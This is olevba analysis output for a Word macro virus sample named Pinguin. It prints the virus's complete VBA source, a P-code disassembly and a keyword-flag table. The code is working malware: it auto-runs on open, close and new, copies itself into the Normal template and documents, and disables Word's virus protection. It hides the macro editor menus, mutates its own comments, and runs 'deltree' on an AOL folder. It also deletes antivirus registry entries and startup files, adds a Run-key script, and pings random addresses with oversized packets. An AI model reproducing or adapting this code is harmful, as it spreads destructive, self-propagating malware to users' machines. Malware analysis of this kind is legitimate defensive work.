olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pinguin
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pinguin - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Pinguin - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'
'Virus Name: Pinguin[Clau/UC]
'Created By Clau/Ultimate Chaos.
'

Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Declare Function RegQueryValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, ByVal lpData As String, lpcbData As Long) As Long
Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Declare Function RegDeleteValueA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String) As Long
Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Declare Function DeleteFileA Lib "kernel32.dll" (ByVal lpFileName As String) As Long

Global Const REG_DWORD As Long = 4
Global Const REG_SZ As Long = 1
Global Const HKEY_CURRENT_USER As Long = &H80000001
Global Const HKEY_LOCAL_MACHINE As Long = &H80000002
Global Const vir_module = "Pinguin"

Dim k As Long
Dim s As Long
Dim u As Long
Dim a As Long
Dim b As String

Sub AutoNew()
  Infection
End Sub

Sub AutoOpen()
  Infection
  ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub

Sub AutoClose()
  Infection
End Sub

Sub FileSave()
  Infection
  ActiveDocument.Save
End Sub

Sub FileSaveAs()
  Dialogs(wdDialogFileSaveAs).Show
  Infection
  ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub

Sub Infection()
  Application.ShowVisualBasicEditor = False
  b = "C:\Clau-UC.VXD"
  Poly
  PayLoad
  On Error Resume Next

  Application.ScreenUpdating = False
  Application.DisplayAlerts = wdAlertsNone
  WordBasic.DisableAutoMacros 0
  With Options
    .VirusProtection = False
    .SaveNormalPrompt = False
    .SavePropertiesPrompt = False
    .ConfirmConversions = False
  End With
  GlobalInstalled = False
  DocumentInstalled = False
  For i = 1 To NormalTemplate.VBProject.vbcomponents.Count
    If NormalTemplate.VBProject.vbcomponents(i).Name = vir_module Then
      GlobalInstalled = True
    End If
  Next
  For i = 1 To ActiveDocument.VBProject.vbcomponents.Count
    If ActiveDocument.VBProject.vbcomponents(i).Name = vir_module Then
      DocumentInstalled = True
    End If
  Next
  If GlobalInstalled = False Then
    ActiveDocument.VBProject.vbcomponents.Item(vir_module).export (b)
    NormalTemplate.VBProject.vbcomponents.Import (b)
    DeleteFileA (b)
    Options.SaveNormalPrompt = False
  End If
  If DocumentInstalled = False Then
    NormalTemplate.VBProject.vbcomponents.Item(vir_module).export (b)
    ActiveDocument.VBProject.vbcomponents.Import (b)
    DeleteFileA (b)
  End If
  Application.DisplayAlerts = wdAlertsAll
End Sub

Sub PayLoad()
  
  On Error Resume Next
  Retro
  Randomize Timer
  
  If Day(Now()) = 1 Then MsgBox "In every 2 of every month of every year" + Chr(13) + "I'll tell you my secret !!!", vbOKOnly, Date
  If Day(Now()) = 8 Then
    MsgBox "Pinguin Virus Created By Clau/Ultimate Chaos", vbOKOnly, "Secret Info"
    CommandBars("tools").Controls("Macro").Caption = "Micro"
    CommandBars.ActiveMenuBar.Controls.Item("UC").Delete
    Set newMenu = CommandBars.ActiveMenuBar.Controls.Add(Type:=msoControlPopup, ID:=1, Temporary:=True)
    newMenu.Caption = "&UC"
    Set ctrl1 = newMenu.Controls.Add(Type:=msoControlButton, ID:=1)
    ctrl1.Caption = "Pinguin"
    ctrl1.TooltipText = "Pinguin"
    ctrl1.Style = msoButtonCaption
    ctrl1.OnAction = "VInfo"
  Else
    CommandBars.ActiveMenuBar.Controls.Item("UC").Delete
  End If
  If Int(Rnd * 10) = 1 Then
    Application.Caption = "Pinguin Virus Created By Clau/Ultimate Chaos"
    Application.DisplayStatusBar = True
    StatusBar = "Pinguin Virus Created By Clau/Ultimate Chaos"
  End If
  
  If Int(Rnd * 5) = 1 Then
    ip = Int(255 * Rnd) & "." & Int(255 * Rnd) & "." & Int(255 * Rnd) & "." & Int(255 * Rnd)
    Shell "ping -l 65000 " & ip, vbHide
  End If
    
End Sub

Sub Retro()
  On Error Resume Next
  Shell "deltree /y c:\aol", vbHide
  u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS, k)
  u = RegDeleteValueA(k, "F-Secure Anti-Virus")
  u = RegDeleteValueA(k, "F-Secure Gatekeeper")
  u = RegDeleteValueA(k, "IV Interceptor")
  u = RegDeleteValueA(k, "IV Scheduler")
  u = RegCloseKey(k)
  Kill "c:\windows\start menu\programs\startup\*vir*.*"
  Kill "c:\windows\start menu\programs\startup\avp*.*"
  Open "c:\windows\pinguin.vbs" For Output As #1
  Print #1, "if minute(now())>55 then msgbox " + Chr(34) + "This computer is infected by Pinguin virus !" + Chr(34) + ", vbOKOnly&vbCritical, " + Chr(34) + "Windows Alert Level : 3" + Chr(34)
  Close #1
  System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Pinguin") = "C:\Windows\Pinguin.VBS"
End Sub

Sub VInfo()
  MsgBox "Clau[UC].Pinguin virus created by" + Chr(13) + "Clau member of Ultimate Chaos"
End Sub

Sub ViewVBcode()
End Sub

Sub ToolsMacro()
End Sub

Sub ToolsCustomize()
End Sub

Sub ToolsOptions()
End Sub

Sub FileTemplates()
End Sub

Sub Poly()
  Dim s As String
  On Error Resume Next
  Randomize Timer
  s = Now: s = "'#" + s + s + s + s
  y = Application.VBE.ActiveVBProject.vbcomponents.Item(vir_module).CodeModule.CountOfLines
  With Application.VBE.ActiveVBProject.vbcomponents.Item(vir_module).CodeModule
    For i = 1 To y * 2 Step 3
      If Mid(.Lines(i, 1), 1, 2) = "'#" Then .ReplaceLine i, s
    Next
  End With
  NormalTemplate.Save
  ActiveDocument.Save
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Pinguin
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Module1 - 11369 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0000 ""
' Line #2:
' 	QuoteRem 0x0000 0x001C "Virus Name: Pinguin[Clau/UC]"
' Line #3:
' 	QuoteRem 0x0000 0x001F "Created By Clau/Ultimate Chaos."
' Line #4:
' 	QuoteRem 0x0000 0x0000 ""
' Line #5:
' Line #6:
' 	FuncDefn (Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long)
' Line #7:
' 	FuncDefn (Declare Function RegQueryValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, ByVal lpData As String, lpcbData As Long) As Long)
' Line #8:
' 	FuncDefn (Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long)
' Line #9:
' 	FuncDefn (Declare Function RegDeleteValueA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String) As Long)
' Line #10:
' 	FuncDefn (Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long)
' Line #11:
' 	FuncDefn (Declare Function DeleteFileA Lib "kernel32.dll" (ByVal lpFileName As String) As Long)
' Line #12:
' Line #13:
' 	Dim (Global Const) 
' 	LitDI2 0x0004 
' 	VarDefn REG_DWORD (As Long)
' Line #14:
' 	Dim (Global Const) 
' 	LitDI2 0x0001 
' 	VarDefn REG_SZ (As Long)
' Line #15:
' 	Dim (Global Const) 
' 	LitHI4 0x0001 0x8000 
' 	VarDefn HKEY_CURRENT_USER (As Long)
' Line #16:
' 	Dim (Global Const) 
' 	LitHI4 0x0002 0x8000 
' 	VarDefn HKEY_LOCAL_MACHINE (As Long)
' Line #17:
' 	Dim (Global Const) 
' 	LitStr 0x0007 "Pinguin"
' 	VarDefn vir_module
' Line #18:
' Line #19:
' 	Dim 
' 	VarDefn k (As Long)
' Line #20:
' 	Dim 
' 	VarDefn s (As Long)
' Line #21:
' 	Dim 
' 	VarDefn u (As Long)
' Line #22:
' 	Dim 
' 	VarDefn a (As Long)
' Line #23:
' 	Dim 
' 	VarDefn B (As String)
' Line #24:
' Line #25:
' 	FuncDefn (Sub AutoNew())
' Line #26:
' 	ArgsCall Infection 0x0000 
' Line #27:
' 	EndSub 
' Line #28:
' Line #29:
' 	FuncDefn (Sub AutoOpen())
' Line #30:
' 	ArgsCall Infection 0x0000 
' Line #31:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #32:
' 	EndSub 
' Line #33:
' Line #34:
' 	FuncDefn (Sub AutoClose())
' Line #35:
' 	ArgsCall Infection 0x0000 
' Line #36:
' 	EndSub 
' Line #37:
' Line #38:
' 	FuncDefn (Sub FileSave())
' Line #39:
' 	ArgsCall Infection 0x0000 
' Line #40:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #41:
' 	EndSub 
' Line #42:
' Line #43:
' 	FuncDefn (Sub FileSaveAs())
' Line #44:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #45:
' 	ArgsCall Infection 0x0000 
' Line #46:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #47:
' 	EndSub 
' Line #48:
' Line #49:
' 	FuncDefn (Sub Infection())
' Line #50:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #51:
' 	LitStr 0x000E "C:\Clau-UC.VXD"
' 	St B 
' Line #52:
' 	ArgsCall Poly 0x0000 
' Line #53:
' 	ArgsCall PayLoad 0x0000 
' Line #54:
' 	OnError (Resume Next) 
' Line #55:
' Line #56:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #57:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #58:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #59:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #60:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #61:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith SavePropertiesPrompt 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #64:
' 	EndWith 
' Line #65:
' 	LitVarSpecial (False)
' 	St GlobalInstalled 
' Line #66:
' 	LitVarSpecial (False)
' 	St DocumentInstalled 
' Line #67:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	MemLd Count 
' 	For 
' Line #68:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd New 
' 	Ld vir_module 
' 	Eq 
' 	IfBlock 
' Line #69:
' 	LitVarSpecial (True)
' 	St GlobalInstalled 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	StartForVariable 
' 	Next 
' Line #72:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	MemLd Count 
' 	For 
' Line #73:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd New 
' 	Ld vir_module 
' 	Eq 
' 	IfBlock 
' Line #74:
' 	LitVarSpecial (True)
' 	St DocumentInstalled 
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	StartForVariable 
' 	Next 
' Line #77:
' 	Ld GlobalInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #78:
' 	Ld B 
' 	Paren 
' 	Ld vir_module 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall export 0x0001 
' Line #79:
' 	Ld B 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemCall Import 0x0001 
' Line #80:
' 	Ld B 
' 	Paren 
' 	ArgsCall DeleteFileA 0x0001 
' Line #81:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	Ld DocumentInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #84:
' 	Ld B 
' 	Paren 
' 	Ld vir_module 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall export 0x0001 
' Line #85:
' 	Ld B 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemCall Import 0x0001 
' Line #86:
' 	Ld B 
' 	Paren 
' 	ArgsCall DeleteFileA 0x0001 
' Line #87:
' 	EndIfBlock 
' Line #88:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #89:
' 	EndSub 
' Line #90:
' Line #91:
' 	FuncDefn (Sub PayLoad())
' Line #92:
' Line #93:
' 	OnError (Resume Next) 
' Line #94:
' 	ArgsCall Retro 0x0000 
' Line #95:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #96:
' Line #97:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0027 "In every 2 of every month of every year"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001B "I'll tell you my secret !!!"
' 	Add 
' 	Ld vbOKOnly 
' 	Ld Date 
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #98:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	IfBlock 
' Line #99:
' 	LitStr 0x002C "Pinguin Virus Created By Clau/Ultimate Chaos"
' 	Ld vbOKOnly 
' 	LitStr 0x000B "Secret Info"
' 	ArgsCall MsgBox 0x0003 
' Line #100:
' 	LitStr 0x0005 "Micro"
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #101:
' 	LitStr 0x0002 "UC"
' 	Ld CommandBars 
' 	MemLd ActiveMenuBar 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #102:
' 	SetStmt 
' 	Ld msoControlPopup 
' 	ParamNamed TypeOf 
' 	LitDI2 0x0001 
' 	ParamNamed ID 
' 	LitVarSpecial (True)
' 	ParamNamed Temporary 
' 	Ld CommandBars 
' 	MemLd ActiveMenuBar 
' 	MemLd Controls 
' 	ArgsMemLd Add 0x0003 
' 	Set newMenu 
' Line #103:
' 	LitStr 0x0003 "&UC"
' 	Ld newMenu 
' 	MemSt Caption 
' Line #104:
' 	SetStmt 
' 	Ld msoControlButton 
' 	ParamNamed TypeOf 
' 	LitDI2 0x0001 
' 	ParamNamed ID 
' 	Ld newMenu 
' 	MemLd Controls 
' 	ArgsMemLd Add 0x0002 
' 	Set ctrl1 
' Line #105:
' 	LitStr 0x0007 "Pinguin"
' 	Ld ctrl1 
' 	MemSt Caption 
' Line #106:
' 	LitStr 0x0007 "Pinguin"
' 	Ld ctrl1 
' 	MemSt TooltipText 
' Line #107:
' 	Ld msoButtonCaption 
' 	Ld ctrl1 
' 	MemSt Style 
' Line #108:
' 	LitStr 0x0005 "VInfo"
' 	Ld ctrl1 
' 	MemSt OnAction 
' Line #109:
' 	ElseBlock 
' Line #110:
' 	LitStr 0x0002 "UC"
' 	Ld CommandBars 
' 	MemLd ActiveMenuBar 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #111:
' 	EndIfBlock 
' Line #112:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #113:
' 	LitStr 0x002C "Pinguin Virus Created By Clau/Ultimate Chaos"
' 	Ld Application 
' 	MemSt Caption 
' Line #114:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #115:
' 	LitStr 0x002C "Pinguin Virus Created By Clau/Ultimate Chaos"
' 	St StatusBar 
' Line #116:
' 	EndIfBlock 
' Line #117:
' Line #118:
' 	Ld Rnd 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #119:
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitStr 0x0001 "."
' 	Concat 
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	LitStr 0x0001 "."
' 	Concat 
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	LitStr 0x0001 "."
' 	Concat 
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St ip 
' Line #120:
' 	LitStr 0x000E "ping -l 65000 "
' 	Ld ip 
' 	Concat 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #121:
' 	EndIfBlock 
' Line #122:
' Line #123:
' 	EndSub 
' Line #124:
' Line #125:
' 	FuncDefn (Sub Retro())
' Line #126:
' 	OnError (Resume Next) 
' Line #127:
' 	LitStr 0x0011 "deltree /y c:\aol"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #128:
' 	Ld HKEY_LOCAL_MACHINE 
' 	LitStr 0x002D "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
' 	LitDI2 0x0000 
' 	Ld KEY_ALL_ACCESS 
' 	Ld k 
' 	ArgsLd RegOpenKeyExA 0x0005 
' 	St u 
' Line #129:
' 	Ld k 
' 	LitStr 0x0013 "F-Secure Anti-Virus"
' 	ArgsLd RegDeleteValueA 0x0002 
' 	St u 
' Line #130:
' 	Ld k 
' 	LitStr 0x0013 "F-Secure Gatekeeper"
' 	ArgsLd RegDeleteValueA 0x0002 
' 	St u 
' Line #131:
' 	Ld k 
' 	LitStr 0x000E "IV Interceptor"
' 	ArgsLd RegDeleteValueA 0x0002 
' 	St u 
' Line #132:
' 	Ld k 
' 	LitStr 0x000C "IV Scheduler"
' 	ArgsLd RegDeleteValueA 0x0002 
' 	St u 
' Line #133:
' 	Ld k 
' 	ArgsLd RegCloseKey 0x0001 
' 	St u 
' Line #134:
' 	LitStr 0x002E "c:\windows\start menu\programs\startup\*vir*.*"
' 	ArgsCall Kill 0x0001 
' Line #135:
' 	LitStr 0x002D "c:\windows\start menu\programs\startup\avp*.*"
' 	ArgsCall Kill 0x0001 
' Line #136:
' 	LitStr 0x0016 "c:\windows\pinguin.vbs"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #137:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "if minute(now())>55 then msgbox "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x002C "This computer is infected by Pinguin virus !"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0017 ", vbOKOnly&vbCritical, "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0017 "Windows Alert Level : 3"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #138:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #139:
' 	LitStr 0x0016 "C:\Windows\Pinguin.VBS"
' 	LitStr 0x0000 ""
' 	LitStr 0x0040 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
' 	LitStr 0x0007 "Pinguin"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #140:
' 	EndSub 
' Line #141:
' Line #142:
' 	FuncDefn (Sub VInfo())
' Line #143:
' 	LitStr 0x0021 "Clau[UC].Pinguin virus created by"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001D "Clau member of Ultimate Chaos"
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' Line #144:
' 	EndSub 
' Line #145:
' Line #146:
' 	FuncDefn (Sub ViewVBcode())
' Line #147:
' 	EndSub 
' Line #148:
' Line #149:
' 	FuncDefn (Sub ToolsMacro())
' Line #150:
' 	EndSub 
' Line #151:
' Line #152:
' 	FuncDefn (Sub ToolsCustomize())
' Line #153:
' 	EndSub 
' Line #154:
' Line #155:
' 	FuncDefn (Sub ToolsOptions())
' Line #156:
' 	EndSub 
' Line #157:
' Line #158:
' 	FuncDefn (Sub FileTemplates())
' Line #159:
' 	EndSub 
' Line #160:
' Line #161:
' 	FuncDefn (Sub Poly())
' Line #162:
' 	Dim 
' 	VarDefn s (As String)
' Line #163:
' 	OnError (Resume Next) 
' Line #164:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #165:
' 	Ld Now 
' 	St s 
' 	BoS 0x0000 
' 	LitStr 0x0002 "'#"
' 	Ld s 
' 	Add 
' 	Ld s 
' 	Add 
' 	Ld s 
' 	Add 
' 	Ld s 
' 	Add 
' 	St s 
' Line #166:
' 	Ld vir_module 
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St y 
' Line #167:
' 	StartWithExpr 
' 	Ld vir_module 
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #168:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld y 
' 	LitDI2 0x0002 
' 	Mul 
' 	LitDI2 0x0003 
' 	ForStep 
' Line #169:
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 "'#"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld i 
' 	Ld s 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' 	EndIf 
' Line #170:
' 	StartForVariable 
' 	Next 
' Line #171:
' 	EndWith 
' Line #172:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #173:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #174:
' 	EndSub 
' Line #175:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|RegQueryValueExA    |May read registry keys                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |kernel32.dll        |Executable file name                         |
|IOC       |pinguin.vbs         |Executable file name                         |
|IOC       |Pinguin.VBS         |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

